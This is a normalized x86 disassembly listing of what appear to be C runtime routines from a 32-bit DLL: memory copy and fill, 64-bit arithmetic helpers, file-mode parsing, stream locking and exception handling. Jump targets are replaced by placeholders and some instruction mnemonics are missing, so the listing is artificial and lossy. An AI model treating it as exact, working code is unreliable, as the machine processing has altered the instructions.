lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000fd34
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000ffa0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_1001323b
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_10010020
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10010060
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1001010a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10009611
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10010155
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10010170
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_100101f4 ]
jmp [ ecx * 4 + jump_table_10010274 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100102e0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1001047c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10010380 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001047c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100102e0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1001047c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100102e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100102e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_100102e0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001047c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001047c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1001047c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_100104e0
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10010598
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1000f19d
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_1000f19d
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_10010669
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_10011e3f
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_100106aa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_10011e3f
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_100106dc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10011d66
pop ecx
pop ebp
retn
sub_10010718
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_10011d66
pop ecx
pop ebp
retn
sub_10010747
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edi [ ecx + 0x7f ]
mov edx 0x4000
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_10013b89
add esp 0x14
test eax eax
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_10013f13
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx edi
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_10013dad
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_10013dad
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_10013dad
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_100109de
push 0x10
push r--data
call sub_1000f940
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_10011e3f
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10010b08
mov eax edi
call sub_1000f985
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
push 0x38
call sub_1000f158
pop ecx
mov ecx [ rw-data ]
mov [ ecx + esi * 4 ] eax
cmp eax ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ eax + esi * 4 ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ eax + esi * 4 ]
call sub_10009957
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_100106aa
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_10011d7d
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_10010718
pop ecx
pop ecx
sub_10010b20
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10010bb0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10014045
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10014064
jmp r-xdata
sub_10010bb0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10008d64
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10010b20
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10010c12
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10010c42
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10010c72
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10010d42
push eax
call sub_10011a20
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_10010592
add eax 0x20
cmp esi eax
jne r-xdata
call sub_10010592
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_1000f158
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_10010d0e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_10010ef9
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_10010d42
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_1000b7fe
mov [ eax ] 0x16
call sub_1000b7ac
or eax 0xffffffff
pop ebp
retn
sub_10010d68
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1001416e
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1000b824
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_1001416e
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_1001416e
push 0x1
mov edi eax
call sub_1001416e
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_100140e8
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_10010e04
push 0x10
push r--data
call sub_1000f940
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b811
and [ eax ] 0x0
call sub_1000b7fe
mov [ eax ] 0x9
call sub_1000b7ac
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1000f985
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_100141d7
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000b7fe
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_10010d68
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10010ec0
mov eax [ ebp - 0x1c ]
sub_10010ec8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10009957
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10010ef9
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10010d42
pop ecx
push eax
call sub_10011903
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_10010f61
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_10010ef9
pop ecx
test eax eax
je r-xdata
push esi
call sub_10010fac
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
